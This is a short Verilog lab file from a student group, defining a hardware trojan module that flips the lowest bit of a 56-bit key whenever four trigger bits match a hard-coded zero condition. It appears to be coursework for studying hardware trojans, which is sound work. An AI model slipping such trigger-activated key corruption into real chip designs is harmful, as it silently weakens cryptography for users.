// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
//Experiement 4 Part 2
//9/17/21

//The trojan_0.v file to determine if the trigger condition is met
// it will return the pay load (modified key) or not.
// The trigger condition can be change by changing the value of the condition register value
// The tigger is decmial 0

module  trojan_0(payload, key, trigger);

input	[55:0]	    key;
input	[1:32]	    trigger;
output	[55:0]	    payload;
reg     [3:0]     condition = 4'b0000;



  assign payload = (trigger[29:32] == condition[3:0]) ? {key[55:1], ~key[0]} : key[55:0]; // LSB is [32]. when condition and trigger is met the key[0] is inverted.

endmodule
